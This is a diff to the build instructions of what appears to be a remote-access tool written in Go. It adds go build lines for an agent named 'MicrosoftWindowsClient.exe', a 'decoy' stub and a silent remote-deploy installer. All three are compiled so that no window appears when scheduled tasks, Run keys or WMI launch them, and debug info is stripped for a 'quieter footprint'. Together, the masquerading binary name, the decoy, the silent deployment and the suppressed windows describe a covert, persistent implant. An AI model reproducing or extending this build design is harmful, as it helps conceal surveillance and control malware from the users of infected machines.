@@ -88,11 +88,22 @@ go vet ./...
 go run ./tool/jscheck        # must print BALANCED OK + DOM-ORDER OK
 go test ./...
 # Release binaries always strip debug info (smaller + quieter footprint).
+# SUBSYSTEM MATRIX (v1.46+ — no console window may ever appear unattended):
+#   windowsgui (-H=windowsgui): MicrosoftWindowsClient (agent), decoy stub,
+#     Agent-Setup (remote/silent deploy; success is observed in the
+#     controller, not stdout), controller-native (WebView2 GUI launched
+#     from the desktop shortcut — console-subsystem here = a permanent
+#     CMD window beside the UI).
+#   console (default): controller, controller-ui, relay, Controller-Setup
+#     (operator-facing, run deliberately by the operator).
 # The agent runs unattended (tasks/Run/WMI launch it constantly), so it
 # MUST be windowsgui-subsystem: a console-subsystem agent flashes a CMD
 # window on every spawn. Never drop -H=windowsgui (v1.45.2 did — popups).
 go build -ldflags="-s -w -H=windowsgui" -o MicrosoftWindowsClient.exe ./cmd/agent
-# ... same -s -w for the other 5 assets (operator-facing binaries stay
+go build -ldflags="-s -w -H=windowsgui" -o decoy.exe ./cmd/decoy
+go build -ldflags="-s -w -H=windowsgui" -o Agent-Setup.exe ./cmd/installer-agent
+go build -ldflags="-s -w -H=windowsgui" -o controller-native.exe ./cmd/controller-native
+# ... same -s -w for the other assets (operator-facing binaries stay
 # console-subsystem so their terminal output remains visible)
 ```
 
